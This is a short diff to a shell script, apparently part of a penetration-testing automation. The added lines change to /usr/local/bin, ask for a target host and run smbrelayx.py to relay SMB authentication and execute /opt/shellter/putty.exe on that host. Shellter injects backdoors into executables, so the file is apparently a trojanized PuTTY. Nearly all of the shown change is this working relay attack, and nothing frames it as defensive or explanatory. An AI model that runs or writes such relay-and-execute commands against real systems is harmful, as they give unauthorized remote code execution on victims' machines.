@@ -54,3 +54,19 @@ expect eof
 EOF
 
 # Return to the original directory or continue with further commands
+
+# Now, navigate to /usr/local/bin to run smbrelayx
+cd /usr/local/bin
+
+# Prompt user for the target host
+read -p "Enter the target host: " target_host
+
+# Execute smbrelayx with the specified target host and executable path
+python3 smbrelayx.py -e /opt/shellter/putty.exe -t "$target_host"
+
+# Optionally, check for success or handle errors
+if [ $? -eq 0 ]; then
+    echo "smbrelayx ran successfully."
+else
+    echo "smbrelayx encountered an error."
+fi
